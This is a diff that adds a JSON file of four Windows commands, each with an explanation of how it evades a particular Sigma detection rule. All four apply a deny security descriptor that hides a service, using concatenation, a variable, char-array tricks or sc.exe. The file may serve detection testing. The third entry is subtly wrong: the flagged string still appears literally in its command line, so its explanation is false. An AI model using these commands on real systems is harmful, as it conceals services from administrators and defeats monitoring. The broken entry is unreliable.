@@ -1,0 +1,18 @@
+[
+  {
+    "output": "pwsh.exe -Command \"Set-Service -Name 'MyService' -SecurityDescriptorSddl ('DCLCW'+'PDTSD')\"",
+    "explanation": "The Sigma rule looks for the literal string 'DCLCWPDTSD' within the command line. By using PowerShell string concatenation, the malicious SDDL string is constructed at runtime, preventing a static match against the CommandLine field while still achieving the same functional result."
+  },
+  {
+    "output": "pwsh.exe -Command \"$s='DCLCWPDTSD'; Set-Service -Name 'MyService' -SecurityDescriptorSddl $s\"",
+    "explanation": "Assigning the sensitive SDDL component to a variable before passing it to the cmdlet breaks the 'contains|all' logic of the Sigma rule, as the command line will contain the variable assignment rather than the direct application of the flagged string to the parameter."
+  },
+  {
+    "output": "pwsh.exe -Command \"Set-Service -Name 'MyService' -SecurityDescriptorSddl (([char[]]'DSTDPWCLCD' | ForEach-Object { $_ }) -join '' -replace 'DSTDPWCLCD','DCLCWPDTSD')\"",
+    "explanation": "This uses character array manipulation and a replacement function to hide the signature 'DCLCWPDTSD' from simple command-line logging and pattern matching."
+  },
+  {
+    "output": "sc.exe sdset MyService D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)",
+    "explanation": "The Sigma rule is specifically scoped to detect 'Set-Service' via 'pwsh.exe' (selection_img). Using the native Windows binary 'sc.exe' to set the Security Descriptor (sdset) bypasses the image name requirement and the PowerShell-specific cmdlet detection logic entirely."
+  }
+]
